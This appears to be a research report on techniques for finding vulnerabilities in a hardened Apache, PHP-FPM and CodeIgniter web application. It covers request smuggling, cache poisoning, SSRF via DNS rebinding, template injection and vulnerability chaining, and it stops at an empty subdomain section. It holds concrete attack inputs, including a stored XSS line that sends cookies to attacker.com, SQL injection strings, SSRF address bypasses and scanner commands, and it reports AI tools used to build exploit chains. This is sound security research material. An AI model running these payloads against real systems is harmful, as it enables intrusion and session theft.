# Novel Vulnerability Discovery Techniques for Hardened Web Applications (2024-2026)

## Second-Order Vulnerability Techniques

### Takeaway
Second-order vulnerabilities remain a potent attack class because input is stored safely but consumed unsafely in a different context later, defeating input-validation at the point of entry. Detection requires tracing data flow through persistent storage, which most automated scanners cannot do.

### Cited Findings
- Second-order SQL injection occurs when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. Detection usually means submitting data in one location, then exercising a different application function that processes the data unsafely. -- [PortSwigger KB](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
- A practical out-of-band variant uses stored payloads that reach SQL Server stored procedures (e.g., xp_dirtree) and leak data through DNS queries to a tester-controlled server. -- [NetSPI Technical Blog](https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/)
- The classic example is a username like `admin'--` stored through a parameterized INSERT, then concatenated into a later password-reset or admin query without parameterization. -- [shahjerry33 on Medium](https://shahjerry33.medium.com/second-order-sql-injection-something-is-hidden-inside-d7d5d5c510a0)
- A 2026 comprehensive guide covers blind, time-based, ORM bypass, and WAF evasion techniques for SQL injection, including second-order variants. -- [Hive Security](https://hivesecurity.gitlab.io/blog/sql-injection-complete-guide-2026/)
- US Patent 11,734,432 describes a method for detecting second-order security vulnerabilities via modelling information flow through persistent storage, indicating that automated detection of this class is an active area of development. -- [USPTO](https://image-ppubs.uspto.gov/dirsearch-public/print/downloadPdf/11734432)

### Inferences
- **Second-order SQLi in CodeIgniter**: CodeIgniter's Active Record / Query Builder parameterizes queries at the point of insertion, but if stored values are later used in raw `$this->db->query()` calls, second-order injection is possible. Registration fields (username, display name, organization) stored safely and later used in admin dashboard queries, PDF generation, or log review queries are prime candidates.
- **Second-order SSRF**: Applications that store URLs (profile pictures, webhook URLs, document import URLs) and fetch them later in background jobs or admin previews create second-order SSRF. The stored URL passes initial validation but is fetched from the server side at a later time, potentially reaching internal services.
- **Second-order command injection**: If stored filenames or user-provided values are later passed to shell commands (e.g., PDF generation via wkhtmltopdf, image processing via ImageMagick, document conversion), command injection payloads stored in benign-looking fields can execute later.

### Gaps
- No reliable 2024-2026 research specifically on second-order SSRF was found; the concept is well-understood but not covered in recent publications the search surfaced.
- No CodeIgniter-specific second-order vulnerability research was found.

---

## HTTP Request Smuggling Against Apache + PHP-FPM

### Takeaway
Apache httpd has had multiple request smuggling CVEs through 2024-2026, particularly in mod_proxy configurations. While no CVE directly ties PHP-FPM to smuggling, the Apache-to-PHP-FPM proxy chain creates the classic two-tier parsing discrepancy that smuggling exploits.

### Cited Findings
- CVE-2023-25690: Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow HTTP Request Smuggling when a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target. Fixed in 2.4.56. -- [Apache httpd Security](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2026-63718: A low-severity mod_proxy_uwsgi Transfer-Encoding response smuggling issue affects Apache HTTP Server from 2.4.30 through 2.4.68, fixed in 2.4.69. -- [Apache httpd Security](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2022-36760: mod_proxy_ajp allows request smuggling to the AJP server via crafted requests. Still listed among the 2.4 advisories as of 2026. -- [Apache httpd Security](https://httpd.apache.org/security/vulnerabilities_24.html)
- PHP bug #80043 reports that the built-in PHP web server accepted a request with two conflicting Transfer-Encoding headers, enabling CL-TE smuggling behind HAProxy. This concerns `php -S`, not PHP-FPM. -- [PHP Bugs](https://bugs.php.net/bug.php?id=80043&edit=1)
- James Kettle's HTTP Terminator (presented at Black Hat USA 2026) is an AI system that generated new HTTP request smuggling techniques and scanned approximately 30,000 authorized sites, finding between 200 and 700 vulnerable targets depending on the source. The source code and a blueprint for adapting it were made public. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c); [FireCompass](https://firecompass.com/field-notes-from-black-hat-and-def-con-2026-what-changed-in-the-attacker-playbook/)
- PortSwigger's August 2025 press release highlights Kettle's desync paper, demonstrating novel smuggling vectors never before seen, and introducing the HTTP Stream Hacker tool. -- [BusinessWire / PortSwigger](https://www.businesswire.com/news/home/20250806802876/en/PortSwigger-Research-Sheds-Light-on-HTTP1.1-Vulnerabilities-Urges-Industry-Shift-Toward-Safer-Protocols)

### Inferences
- **CL-TE and TE-CL against Apache + PHP-FPM**: The classic smuggling setup requires Apache and PHP-FPM to disagree on where one request ends and another begins. Test by sending requests with both Content-Length and Transfer-Encoding headers, with conflicting values, and observing whether the backend processes a smuggled second request.
- **HTTP/2 downgrade smuggling**: If Apache accepts HTTP/2 from clients but proxies to PHP-FPM over HTTP/1.1 (via mod_proxy_fcgi), the H2-to-H1 translation can introduce smuggling vectors. HTTP/2 binary framing encodes content length differently, and the translation layer may not perfectly preserve boundaries.
- **Practical testing steps**: (1) Use Burp Suite's HTTP Request Smuggler extension or Kettle's HTTP Stream Hacker. (2) Send CL-TE and TE-CL probe requests. (3) Test with chunked encoding variations: `Transfer-Encoding: chunked`, `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked` (space before colon), `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`. (4) Check for HTTP/2 support and test H2 smuggling via single-hop request smuggling.

### Gaps
- No CVE directly linking PHP-FPM to request smuggling was found in 2024-2026 research.
- The exact hit count from Kettle's HTTP Terminator research conflicts between sources (200 vs 700 vulnerable targets).

---

## Web Cache Poisoning and Deception Techniques

### Takeaway
Cache poisoning and deception research advanced significantly in 2024-2025, with PortSwigger's "Gotta cache 'em all" research and academic work revealing that parser discrepancies between CDNs/caches and origin servers create exploitable gaps for both data theft (deception) and persistent XSS delivery (poisoning).

### Cited Findings
- PortSwigger's "Gotta cache 'em all" explores how different HTTP servers and proxies behave when parsing specially crafted URLs, introducing novel techniques that leverage parser discrepancies to achieve arbitrary web cache poisoning and deception. It appeared among nominations for the top web hacking techniques of 2024. -- [PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all)
- Web Cache Deception (WCD) achieves its goal by constructing abnormal URLs, and it requires the victim to click on the malicious URL to deceive the cache. -- [Liang et al., ACM CCS 2024](https://www.researchgate.net/publication/386583730_Internet's_Invisible_Enemy_Detecting_and_Measuring_Web_Cache_Poisoning_in_the_Wild)
- Berto's CLOSER 2024 paper presents a new WCD attack vector via web-client-based email services. -- [CLOSER 2024](https://air.unimi.it/retrieve/7df93d97-538a-4df6-9355-7625561e0416/CLOSER_2024_36_CR%20(1).pdf)
- A ChatGPT account takeover via wildcard web cache deception involved path traversal confusion in CDN and web server URL parsing to cache sensitive API endpoints for auth token theft. Nominated for PortSwigger's top 2024 techniques. -- [PortSwigger Nominations 2024](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024-nominations-open)
- Gudifu (guided differential fuzzing) discovers HTTP request parsing discrepancies between frontend and backend servers that enable request smuggling and cache poisoning. -- [PortSwigger Nominations 2024](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024-nominations-open)
- Next.js cache-poisoning chains exploit a spoofable framework-internal header combined with Next.js data-request mechanisms. -- [PortSwigger Nominations 2025](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025-nominations-open)
- A hidden web caches discovery methodology identifies caches the application developer may not know about. -- [arXiv 2407.16303](https://arxiv.org/pdf/2407.16303)

### Inferences
- **Apache-specific cache deception**: Test for path normalization differences between Apache and any upstream CDN/cache. Send requests like `/account/settings/..%2fstatic/logo.png` -- if the cache treats this as a static asset (cacheable) but Apache normalizes the `..%2f` and serves the dynamic account page, the response may be cached and served to other users.
- **Unkeyed header injection**: Test which headers influence the response but are not included in the cache key. Common candidates: `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`. If a CDN ignores these in the cache key but Apache/CodeIgniter uses them to generate links or redirects, you can poison cached responses.
- **Practical testing for Apache + CodeIgniter**: (1) Identify caching layers (Varnish, CloudFlare, mod_cache). (2) Append path extensions: `/api/user.css`, `/api/user.js`, `/api/user.ico` -- see if responses are cached. (3) Test path delimiter confusion: semicolons `/api/user;.css`, null bytes `/api/user%00.css`, double encoding. (4) Check Vary header behavior for missing or overly broad values.

### Gaps
- The full text of "Gotta cache 'em all" could not be fetched, so detailed technique descriptions come from search snippets only.

---

## Timing-Based Attacks and Race Conditions

### Takeaway
Race condition exploitation has matured into a reliable technique with HTTP/2 single-packet attacks enabling sub-millisecond synchronization, and academic research in 2025 introduces the first HTTP/3 race condition tool. Timing side-channels for username enumeration and blind data extraction remain practical against hardened applications.

### Cited Findings
- A 2025 ScienceDirect paper examines six race condition exploitation tools across HTTP/1.1 and HTTP/2, introduces QUICker as the first race condition attack tool for HTTP/3, and notes that new techniques can exploit race windows as narrow as a few milliseconds. -- [ScienceDirect](https://www.sciencedirect.com/science/article/pii/S0167404825004298)
- Last-byte synchronization is the most common attack technique against HTTP/1.1, where the attacker sends all but the last byte of multiple requests, then sends all final bytes simultaneously. -- [YesWeHack Guide](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)
- PortSwigger defines the core race condition pattern: carefully timed requests cause collisions, with typical examples including TOCTOU file-upload races and e-commerce checkout races. -- [PortSwigger Academy](https://portswigger.net/web-security/race-conditions)
- HTTP/2 single-packet attacks send multiple HTTP/2 frames within a single TCP packet, ensuring they arrive at the server simultaneously regardless of network jitter. -- [PortSwigger Academy](https://portswigger.net/web-security/race-conditions)

### Inferences
- **OTP/Authentication race conditions**: If the target uses OTP authentication, test for race conditions in OTP validation. Send multiple simultaneous requests with the same OTP to see if it can be reused. Test whether rate limiting on OTP attempts can be bypassed by sending requests in parallel.
- **Username enumeration via timing**: Even with identical error messages, measure response times for valid vs. invalid usernames. Database lookups for existing users may take measurably longer (or shorter) than the "user not found" path. Use statistical analysis over many requests to detect differences of even a few milliseconds.
- **Document endpoint races**: If the application has document upload/processing endpoints, test for TOCTOU vulnerabilities where a file passes validation but is replaced before processing.
- **Practical testing steps**: (1) Use Burp Suite's Turbo Intruder with the `race-single-packet-attack.py` script for HTTP/2 targets. (2) For HTTP/1.1, use last-byte synchronization. (3) Target state-changing operations: coupon redemption, account balance updates, role assignments, OTP validation. (4) Send 20-50 parallel requests and analyze responses for inconsistencies.

### Gaps
- No specific timing attack research against CodeIgniter or Apache + PHP-FPM stack was found.

---

## Client-Side Vulnerability Discovery Beyond XSS

### Takeaway
Prototype pollution, client-side template injection (CSTI), and postMessage vulnerabilities form a class of client-side attacks that bypass traditional XSS defenses like CSP. Prototype pollution in particular has been shown to chain with template engines (Vue 2, Angular) to achieve code execution without any XSS in the traditional sense.

### Cited Findings
- GHunter (2024): A systematic approach to finding universal prototype pollution gadgets in JavaScript runtimes, published as an academic paper. -- [arXiv 2407.10812](https://arxiv.org/pdf/2407.10812)
- Silent Spring demonstrated that prototype pollution leads to remote code execution in Node.js through gadget chains in common packages. -- [arXiv 2207.11171](https://arxiv.org/pdf/2207.11171)
- CSTI can be the second stage of a client-side prototype pollution chain. The Vue 2 template compiler used inherited values of properties such as `staticClass` and `staticStyle` while generating render code. If another bug lets an attacker set these properties on `Object.prototype`, later template compilation can turn the polluted string into JavaScript execution. -- [HackTricks](https://hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html)
- The quick way to tell CSTI from SSTI: re-request the input with a non-browser client (curl). If the test output appears in the raw HTTP response body, it is server-side (SSTI); if it only appears in the rendered DOM after JavaScript runs, it is client-side (CSTI). -- [Intigriti Blog](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti)
- PortSwigger's 2025 Top 10 included a Chrome connection-pool XS-leak, where cross-site information leakage is achieved through the browser's connection pool behavior. -- [PortSwigger Top 10 2025](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)

### Inferences
- **postMessage vulnerabilities**: Check if the application uses `window.postMessage()` for cross-origin communication without proper origin validation. Tools like PMHook (browser extension) can monitor all postMessage calls. If the application accepts messages from any origin, an attacker's page can send messages that trigger actions.
- **DOM clobbering**: If the application uses `document.getElementById()` or accesses properties of `document` by name, an attacker who can inject HTML (even without script execution, e.g., via Markdown rendering) can create elements whose `id` or `name` attributes shadow JavaScript variables.
- **Practical testing for CodeIgniter apps**: Even though CodeIgniter is server-rendered, modern apps often include client-side JavaScript frameworks. Check for: (1) Angular/Vue/React components embedded in CI views. (2) Third-party JavaScript widgets. (3) Client-side routing that may handle URLs differently than the server.

### Gaps
- No prototype pollution research specific to PHP backends was found (it is primarily a JavaScript/Node.js concern, but client-side JavaScript on PHP-served pages remains affected).

---

## Unconventional Input Vectors

### Takeaway
HTTP headers (User-Agent, Referer, X-Forwarded-For), cookie values, and Accept-Language are frequently stored in databases or logs without sanitization, creating injection opportunities that standard security testing overlooks because scanners typically fuzz only URL parameters and POST body fields.

### Cited Findings
- Attackers frequently inject malicious scripts or code into the User-Agent header, leading to XSS when the server reflects it back, or SQL injection when the value is stored unsanitized in a database. -- [Akto Academy](https://akto.io/academy/http-header-injection)
- Some applications inspect the Referer header to detect that a user arrived via a search engine, then echo or highlight the user's search term in the response. If not properly sanitized, a crafted Referer value can enable persistent content injection. -- [Zero Protocol Cyber](https://zeroprotocolcyber.substack.com/p/analyzing-the-application)
- Headers that influence the response body but are excluded from the cache key (Referer, User-Agent, X-Forwarded-Host) enable persistent cache poisoning. -- [Decepticon skill](https://tessl.io/registry/skills/github/PurpleAILAB/Decepticon/header-injection)
- Spoofing the User-Agent to reach a mobile version can expose an entirely different code path that may not have received as much security testing. -- [SANS ISC](https://isc.sans.edu/diary/HTTP+Headers...+the+Achilles%27+heel+of+many+applications/22382)
- HTTP Header-Based SQL Injection: The User-Agent, Referer, and X-Forwarded-For headers are common vectors for SQL injection in applications that log or store these values. -- [Medium / theabdullah.office](https://medium.com/@theabdullah.office/http-header-based-sql-injection-47199a87b7ad)

### Inferences
- **Admin panel log viewers**: If the application has an admin panel that displays access logs, the User-Agent and Referer values are likely rendered in HTML. A stored XSS payload in User-Agent (`<script>document.location='https://attacker.com/?c='+document.cookie</script>`) may execute when an admin views the logs.
- **X-Forwarded-For in CodeIgniter**: CodeIgniter's `$this->input->ip_address()` checks X-Forwarded-For if configured with `$config['proxy_ips']`. If this value is stored in a database for audit logging and later displayed, it becomes a stored injection vector.
- **Accept-Language**: Rarely tested, but if the application uses Accept-Language to select templates or include files, it may be vulnerable to path traversal or template injection.
- **Cookie value injection**: Cookie values are often trusted more than URL parameters. If the application stores session metadata in cookies that are later reflected or used in queries, they become injection vectors.
- **Practical testing steps**: (1) Use Burp Suite's Intruder to fuzz each HTTP header individually with SQLi and XSS payloads. (2) Pay special attention to User-Agent, Referer, X-Forwarded-For, Accept-Language, and Cookie headers. (3) After injecting payloads, visit admin panels and log viewers to check for stored XSS. (4) Monitor for out-of-band DNS callbacks (use Burp Collaborator or interactsh).

### Gaps
- No 2024-specific research report or CVE specifically focused on header-based injection was found.

---

## Server-Side Template Injection (SSTI) in PHP/CodeIgniter

### Takeaway
PHP SSTI is possible in applications using Twig, Blade, Smarty, or even raw PHP templates. CodeIgniter 3 uses a simple PHP-based template parser that is less expressive than Twig/Smarty, but CodeIgniter 4's view system and third-party template libraries can introduce SSTI. The 2025 PortSwigger Top 10 highlighted error-based template injection as the top technique.

### Cited Findings
- SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates. -- [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/)
- Akaunting 3.1.8 SSTI (May 2024): A PHP accounting application was found vulnerable to SSTI, published on Exploit-DB. -- [Exploit-DB](https://www.exploit-db.com/exploits/52030)
- Error-based template injection research won the #1 spot in PortSwigger's Top 10 Web Hacking Techniques of 2025, adding two more exploitation modes borrowed from SQL injection's playbook. -- [PortSwigger Top 10 2025](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
- A 2026 deep-dive describes SSTI as occurring when applications embed user input into server-side templates without proper sanitization, allowing attackers to inject template directives that the server executes. -- [DeepStrike](https://deepstrike.io/blog/server-side-template-injection)

### Inferences
- **CodeIgniter 3 Parser class**: CI3's `{variable}` syntax in the Template Parser is simple substitution and does not evaluate expressions, making traditional SSTI difficult. However, if the application uses a third-party template engine (Twig, Smarty, Blade) alongside or instead of CI's parser, SSTI becomes possible.
- **Error message template injection**: If error pages or email templates include user-supplied data that passes through a template engine, they become SSTI vectors. The 2025 #1 technique (error-based template injection) specifically targets error handling paths.
- **Practical testing steps for CI**: (1) Test template syntax for multiple engines: `{{7*7}}` (Twig), `{php}echo 7*7;{/php}` (Smarty), `<?= 7*7 ?>` (raw PHP). (2) Inject into all input fields and check if the evaluated result appears. (3) Focus on error pages, email templates, PDF generation, and report outputs. (4) Check if CI4's view cells or components process user input through templates.

### Gaps
- No CodeIgniter-specific SSTI CVE was found.
- The full details of the error-based template injection technique (#1 in PortSwigger 2025) could not be fetched.

---

## DNS Rebinding and SSRF Techniques

### Takeaway
DNS rebinding continues to bypass SSRF protections in 2024-2026 because of a fundamental time-of-check/time-of-use gap: hostname validation resolves DNS once, but the HTTP client resolves it again for the actual connection. Recent CVEs in MindsDB, Budibase, and MCP Atlassian demonstrate that this pattern remains widespread.

### Cited Findings
- MindsDB (CVE-2024-24759): The SSRF check resolved a hostname once, then the request resolved it again. An attacker-controlled name could return a public IP first and 127.0.0.1 later. -- [GitLab Advisory Database](https://advisories.gitlab.com/pypi/mindsdb/CVE-2024-24759/)
- Budibase (CVE-2026-72855): The OpenAPI import path validated a hostname and then fetched it separately, so a name that resolves to a public address during validation and to 127.0.0.1 during the request is accepted. A second path (REST query execution) re-resolved the hostname at connection time, defeating an earlier DNS-pinning fix. -- [Corgea](https://corgea.com/advisories/vulnerabilities/CVE-2026-72855)
- MCP Atlassian (CVE-2026-77265): The header-based authentication flow used a validate-then-use pattern. The check resolved DNS and confirmed a public address, but the later request could reach internal targets such as the cloud metadata address 169.254.169.254. -- [Corgea](https://corgea.com/advisories/vulnerabilities/CVE-2026-77265)
- link-preview-js (CVE-2026-61704): The mitigation validates one resolved IP address but fetches the original hostname. Redirect handling had the same validation-to-fetch mismatch. Fixed in 4.0.4. -- [OpenCVE](https://app.opencve.io/cve/CVE-2026-61704)

### Inferences
- **Testing SSRF in CodeIgniter**: Look for any functionality that fetches external URLs: webhook integrations, URL preview/unfurling, document import by URL, avatar/image URL fetching, PDF generation from URLs. Test with a DNS rebinding service (e.g., rbndr.us, rebind.it, or a custom DNS server) that alternates between a public IP and 127.0.0.1.
- **Cloud metadata SSRF**: If the application runs on AWS/GCP/Azure, test whether SSRF can reach the metadata endpoint (169.254.169.254 for AWS, metadata.google.internal for GCP). Even with SSRF protections, DNS rebinding or redirect-based bypasses may work.
- **Practical testing steps**: (1) Identify all URL input fields and server-side fetch functionality. (2) Test with `http://127.0.0.1`, `http://[::1]`, `http://0x7f000001`, `http://0177.0.0.1` (octal), `http://2130706433` (decimal). (3) Test DNS rebinding with services like rbndr.us. (4) Test redirect-based SSRF: point to an attacker server that 302-redirects to internal addresses.

### Gaps
- No CodeIgniter-specific SSRF CVE or research was found.

---

## API Endpoint Discovery and Hidden Functionality

### Takeaway
JavaScript file analysis, source map disclosure, and webpack chunk enumeration are the primary techniques for discovering hidden API endpoints in modern applications. Even PHP/CodeIgniter applications that serve traditional HTML often include JavaScript bundles that reveal internal API routes, admin endpoints, and hardcoded secrets.

### Cited Findings
- Exposed Webpack sourcemaps on a target application revealed a previously unreferenced function named `updateUserData` that did not appear in any documented workflow. -- [Sentry Blog](https://blog.sentry.security/abusing-exposed-sourcemaps/)
- Developers build admin or internal features, protect them with client-side checks only, and ship the endpoint URLs in the JavaScript bundle for anyone to read. -- [HackerSatty on Medium](https://hackersatty.medium.com/how-to-find-hidden-api-endpoints-and-secrets-in-javascript-files-for-bug-bounties-web-app-f4ea92d16954)
- Tools for endpoint discovery: LinkFinder, SecretFinder, katana, gospider, hakrawler, unwebpack-sourcemap. The Chakra harvester for Next.js/React SPAs recursively extracts JS chunks, recovers source maps, scans for secrets, maps API surfaces, and discovers subdomains. -- [GitHub Topics: endpoint-discovery](https://github.com/topics/endpoint-discovery?o=desc&s=updated)
- Raunaksplanet's endpoint-finder auto-unpacks .js.map sources from a headless Chromium run, discovering endpoints that static analysis would miss. -- [GitHub: endpoint-finder](https://github.com/Raunaksplanet/endpoint-finder)
- jsmap performs passive JavaScript recon for bug bounty, extracting endpoints, secrets, hosts and parameters from the JS a target already serves, with zero dependencies. -- [GitHub: jsmap](https://github.com/harshexploits/jsmap)

### Inferences
- **CodeIgniter-specific discovery**: (1) Check `robots.txt` and `sitemap.xml` for paths. (2) Fuzz for common CI controller names: `/admin`, `/api`, `/dashboard`, `/panel`, `/backend`, `/migrate`, `/test`, `/debug`. (3) Check for CI's default routes: `/welcome`, `/index.php/controller/method`. (4) Look for `.env` file exposure at the web root. (5) Check for `application/config/` directory exposure.
- **Legacy endpoint discovery**: Use `ffuf` or `dirsearch` with a CI-specific wordlist. Common CI paths include `/index.php/user/login`, `/index.php/admin/dashboard`, `/index.php/api/v1/`. Test both with and without `index.php` in the path.
- **Source map and JS analysis steps**: (1) Download all JavaScript files referenced in the HTML. (2) Check for `.js.map` files by appending `.map` to each JS URL. (3) Run LinkFinder or jsmap against all JS files. (4) Search for API keys, tokens, and internal URLs in the extracted source.

### Gaps
- No CodeIgniter-specific endpoint discovery tool or technique was found in recent research.

---

## Vulnerability Chaining Techniques

### Takeaway
Chaining low-severity findings into critical exploit chains is a proven strategy against hardened targets. Real-world examples from Black Hat 2026 and bug bounty programs demonstrate that three or more low-rated flaws can combine into full account takeover or data exfiltration.

### Cited Findings
- Three low-rated flaws chained into full mailbox, calendar, SharePoint and OneDrive exfiltration from one click on a microsoft.com link. Presented at Black Hat USA 2026. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- A four-link pre-auth RCE chain in WordPress core was built on $25 of a $200 AI subscription in just over ten hours. Presented at Black Hat USA 2026. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- A Grafana open redirect in a plugin installer let attackers get Grafana to load a malicious external plugin, ending in stored XSS. -- [Bugcrowd Blog](https://www.bugcrowd.com/blog/how-to-find-bugs-on-a-hardened-target-using-gadgets/)
- Ivanti Cloud Service Appliances (September 2024): Attackers used one administrative bypass (CVE-2024-8963) in two routes, one with two RCE flaws and one with a SQL injection. The bypass accomplishes little on its own. -- [Cycode Blog](https://cycode.com/blog/attack-chaining/)
- An open redirect rated low on its own can become serious when paired with a Client-Side Path Traversal (CSPT) or SSO misconfiguration. -- [Bugcrowd Blog](https://www.bugcrowd.com/blog/how-to-find-bugs-on-a-hardened-target-using-gadgets/)

### Inferences
- **Chaining strategy for the target stack**: (1) Open redirect + OAuth/SSO = token theft. (2) CSRF on a non-critical endpoint + stored XSS in admin logs = admin account takeover. (3) Information disclosure (version numbers, internal paths) + known CVE = targeted exploitation. (4) Race condition in OTP + brute force = authentication bypass. (5) Path normalization difference between Apache and CI + cache poisoning = cached credential theft.
- **Practical approach**: Map every "informational" or "low" finding as a potential chain link. Look for ways to combine: information disclosure + injection, CSRF + privilege escalation, open redirect + phishing, race condition + business logic bypass.

### Gaps
- Specific payout amounts for chained vulnerabilities are unreliable in the sources found.

---

## PortSwigger Top 10 Web Hacking Techniques of 2025

### Takeaway
The 2025 list reveals that error-based template injection, ORM data leaking, and parser differentials are the cutting-edge techniques, with many directly applicable to PHP/Apache stacks. The list shows a trend toward exploiting parsing differences between layers.

### Cited Findings
- #1: Error-based template injection research adds two more exploitation modes borrowed from SQL injection's playbook. -- [PortSwigger](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
- ORM data leaking takes ORM data leaking from a niche, framework-specific curiosity to a generic attack methodology applicable across frameworks. -- [PortSwigger](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)
- Parser differentials and Chrome connection-pool XS-leak are on the list: duplicate JSON keys or double Authorization headers parsed differently by frontend vs backend. -- [HackerNotes Ep. 163](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-163-portswigger-top-10-web-hacking-techniques-of-2025)
- 63 nominations were received for the 2025 list, cut to fifteen and then ten. -- [PortSwigger](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025)

### Inferences
- **Error-based template injection for CodeIgniter**: Even if the application does not use a traditional template engine, error messages that include user input may be processed through a template-like mechanism. Test by causing errors with template syntax in input fields.
- **ORM data leaking for CodeIgniter**: CI's Active Record / Query Builder may be vulnerable to ORM-level data leaking if query parameters are not properly typed. Test by sending array parameters where scalars are expected (e.g., `?id[]=1&id[]=2` or `?filter[$gt]=0`).
- **Parser differentials**: Test how Apache and CodeIgniter handle duplicate headers, duplicate query parameters, and conflicting content types differently. This is especially relevant for the layered path handling (Apache + CI routing).

### Gaps
- The full text of the PortSwigger page could not be fetched, so individual technique details are based on secondary sources.

---

## Black Hat / DEF CON 2024-2026 Novel Techniques

### Takeaway
The 2024-2026 conference cycle shows that AI-assisted vulnerability discovery, low-severity chaining, and HTTP protocol-level attacks are the dominant themes. The core vulnerability classes remain the same, but the economics and tooling for finding them have shifted dramatically.

### Cited Findings
- James Kettle's HTTP Terminator used AI to generate new HTTP request smuggling techniques and scanned ~30,000 authorized sites, finding 200-700 vulnerable targets. Source code made public. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- A pre-auth RCE chain in WordPress core was discovered using AI assistance at a cost of $25 in ~10 hours. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- Three low-rated Microsoft flaws chained into full O365 data exfiltration from one click. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- XBOW disclosed CVE-2026-59774, a critical unauthenticated file-read flaw in Gitea. -- [XBOW Blog](https://xbow.com/blog/blackhat-2026-hacking-past-future)
- A Rovo link flaw exfiltrated victim-accessible secrets through an attacker-controlled image request. -- [CISO Platform](https://www.cisoplatform.com/profiles/blogs/session-highlights-field-notes-from-black-hat-def-con-2026-what-c)
- FireCompass argues that the vulnerability classes on display at Black Hat USA 2026 and DEF CON 34 were the same ones security teams have tracked for a decade, with the change being economic rather than technical. -- [FireCompass](https://firecompass.com/field-notes-from-black-hat-and-def-con-2026-what-changed-in-the-attacker-playbook/)
- Talks combining AI and offense rose from 23 in 2025 to 47 in 2026. -- [OffSec Blog](https://www.offsec.com/blog/10-lessons-from-black-hat-and-def-con-2026/)
- AutoEG: An academic paper on exploiting known third-party vulnerabilities in black-box web applications through automated exploit generation. -- [arXiv 2604.00704](https://arxiv.org/pdf/2604.00704)

### Inferences
- **AI-assisted discovery is now practical**: The WordPress RCE chain example demonstrates that AI can identify complex multi-step vulnerabilities in well-audited codebases. Tools like HTTP Terminator automate the discovery of protocol-level bugs at scale.
- **For the target stack**: The most applicable conference findings are HTTP smuggling (Kettle's work), chaining low-severity findings (Microsoft example), and parser differential exploitation. These techniques directly apply to an Apache + PHP-FPM + CodeIgniter stack.

### Gaps
- Primary source materials (actual slides, papers, and tools) from the conferences could not be fetched directly.

---

## Automated Tooling Approaches

### Takeaway
Nuclei with its 12,000+ community templates, custom Burp extensions, and specialized ffuf patterns form the core automated discovery toolkit. The community publishes new CVE templates within hours of disclosure, making Nuclei effective for rapid vulnerability scanning even against hardened applications.

### Cited Findings
- Nuclei is a free, MIT-licensed scanner with 27,000+ GitHub stars that runs 12,000+ community YAML templates. The nuclei-templates community publishes new CVE templates within hours of disclosure. -- [AppSecSanta](https://appsecsanta.com/dast-tools/nuclei-vs-burp-suite)
- Nuclei's approach focuses on the core engine and leaves vulnerability checks to the end user. Templates are defined in a straightforward YAML format, and each template can run independently. -- [ProjectDiscovery Blog](https://blog.projectdiscovery.io/community-powered-scanning-with-nuclei)
- Burp Suite focuses on HTTP/HTTPS/WebSocket traffic through its intercepting proxy for deep, single-application testing. Nuclei is template-driven automation only, with no interactive testing capabilities. The two tools are complementary rather than interchangeable. -- [AppSecSanta](https://appsecsanta.com/nuclei-vs-burp-suite)

### Inferences
- **Recommended automated workflow for the target**: (1) Run nuclei with the full template set for quick wins: `nuclei -u https://target.com -t cves/ -t vulnerabilities/ -t misconfiguration/`. (2) Use ffuf for directory and parameter fuzzing: `ffuf -u https://target.com/FUZZ -w /path/to/codeigniter-wordlist.txt`. (3) Use Burp Suite's active scanner for deep testing of individual endpoints. (4) Run ParamSpider or Arjun to discover hidden parameters. (5) Use custom Nuclei templates for CI-specific checks (e.g., `.env` exposure, `application/config/` access, debug mode detection).
- **Custom templates to write**: Templates for CodeIgniter-specific misconfigurations: exposed `system/` directory, `.htaccess` bypass, `ENVIRONMENT` set to `development`, exposed `composer.json`/`composer.lock`, `phpinfo()` pages, CI profiler enabled.

### Gaps
- No specific nuclei template set targeting CodeIgniter was found in the research.

---

## Subdomain and Virtual Host Discovery

### Takeaway
Virtual host enumeration and subdomain discovery can reveal additional attack surface that may be less hardened than the primary application. Legacy or development subdomains often lack the security controls applied to production.

### Cited Findings
- No specific 2024-2026 research was surfaced by the searches on this topic, but the techniques are well-established.

### Inferences
